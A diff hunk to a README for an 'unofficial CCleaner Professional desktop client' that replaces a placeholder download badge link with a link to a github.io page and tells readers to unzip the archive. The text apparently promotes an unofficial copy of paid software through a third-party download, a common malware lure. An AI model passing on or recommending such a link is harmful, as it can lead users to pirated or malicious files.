@@ -6,7 +6,7 @@ This unofficial CCleaner Professional desktop client brings advanced system clea
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://ccleaner-professional-desktop.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
